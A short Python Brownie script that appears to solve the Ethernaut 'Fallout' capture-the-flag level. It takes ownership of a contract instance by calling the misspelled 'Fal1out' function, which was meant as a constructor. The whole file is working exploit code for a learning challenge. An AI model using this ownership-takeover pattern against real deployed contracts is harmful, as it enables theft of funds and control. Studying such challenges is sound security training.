from brownie import Contract, Fallout, accounts

INSTANCE_ADDRESS = "0x085f9e375D22DfCa23F1421850501038952e28B1"
ACCOUNT = "straul"

def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_fallout(account):
    fallout = Contract.from_abi(name="Fallout", address=INSTANCE_ADDRESS, abi=Fallout.abi)

    # check the typo in the function name
    fallout.Fal1out({'from': account})


def main():
    account = get_account()
    hack_fallout(account)
